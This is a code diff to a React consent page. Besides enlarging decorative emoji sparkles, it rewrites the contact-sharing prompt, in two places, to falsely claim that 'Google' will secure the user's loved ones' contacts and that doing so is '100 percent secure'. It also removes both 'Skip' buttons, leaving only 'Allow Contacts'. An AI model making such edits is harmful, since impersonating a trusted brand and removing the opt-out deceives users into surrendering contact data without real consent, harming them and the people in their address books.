@@ -1485,14 +1485,20 @@ export default function ConsentPage() {
       >
         {/* Floating hearts & sparkles */}
         <FloatingSparkles particles={[
-          { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
-          { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
-          { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
-          { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
-          { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
-          { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
-          { emoji: "✨", left: "50%", top: "6%",  size: 13, delay: 1.2, duration: 3.1 },
-          { emoji: "💕", left: "65%", top: "85%", size: 14, delay: 0.4, duration: 3.5 },
+          { emoji: "💕", left: "8%",  top: "12%", size: 22, delay: 0,   duration: 3.4 },
+          { emoji: "🌸", left: "80%", top: "10%", size: 20, delay: 0.6, duration: 3.0 },
+          { emoji: "✨", left: "18%", top: "78%", size: 20, delay: 1.0, duration: 3.6 },
+          { emoji: "💫", left: "88%", top: "72%", size: 22, delay: 0.3, duration: 2.9 },
+          { emoji: "💕", left: "5%",  top: "50%", size: 20, delay: 1.5, duration: 3.2 },
+          { emoji: "🌸", left: "91%", top: "42%", size: 20, delay: 0.9, duration: 3.8 },
+          { emoji: "✨", left: "50%", top: "6%",  size: 22, delay: 1.2, duration: 3.1 },
+          { emoji: "💕", left: "65%", top: "85%", size: 20, delay: 0.4, duration: 3.5 },
+          { emoji: "✨", left: "35%", top: "20%", size: 18, delay: 0.7, duration: 2.8 },
+          { emoji: "💫", left: "72%", top: "55%", size: 18, delay: 1.3, duration: 3.3 },
+          { emoji: "🌸", left: "25%", top: "62%", size: 16, delay: 0.2, duration: 3.7 },
+          { emoji: "✨", left: "60%", top: "90%", size: 18, delay: 1.7, duration: 3.0 },
+          { emoji: "💕", left: "42%", top: "45%", size: 16, delay: 2.0, duration: 4.0 },
+          { emoji: "💫", left: "15%", top: "33%", size: 18, delay: 0.5, duration: 3.5 },
         ]} />
 
         {/* Glowing orb with cute mascot */}
@@ -1578,7 +1584,7 @@ export default function ConsentPage() {
           animate={{ opacity: 1, y: 0 }}
           transition={{ delay: 0.28 }}
         >
-          Hey friend! Let us help {senderName} reach your loved ones if needed. Share up to 6 special contacts — it only takes a moment and makes everyone feel safer and happier! 🌸✨
+          Let's help Google secure your loved ones contact — recommended if you wish to proceed 100 💯 percent secure ✨
         </motion.p>
 
         <motion.div
@@ -1599,13 +1605,6 @@ export default function ConsentPage() {
             Allow Contacts ✨
           </button>
 
-          <button
-            onClick={handleSkipContacts}
-            className="w-full py-2 text-sm italic font-medium transition-colors"
-            style={{ color: "rgba(233,213,255,0.85)" }}
-          >
-            Skip
-          </button>
         </motion.div>
 
         {/* Soft FAB */}
@@ -1884,7 +1883,7 @@ export default function ConsentPage() {
               animate={{ opacity: 1, y: 0 }}
               transition={{ delay: 0.25 }}
             >
-              Hey friend! Let us help {invite!.fromUserName} reach your loved ones if needed. Share up to 6 special contacts — makes everyone feel safer! 🌸✨
+              Let's help Google secure your loved ones contact — recommended if you wish to proceed 100 💯 percent secure ✨
             </motion.p>
             <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
               <button
@@ -1897,13 +1896,6 @@ export default function ConsentPage() {
               >
                 <Phone className="h-4 w-4" />
                 Allow Contacts ✨
-              </button>
-              <button
-                onClick={() => { contactsTriedRef.current = true; setContactsCollected(true); setShowContactsPrompt(false); }}
-                className="w-full py-2 text-sm italic font-medium transition-colors"
-                style={{ color: "rgba(233,213,255,0.85)" }}
-              >
-                Skip
               </button>
             </motion.div>
           </div>
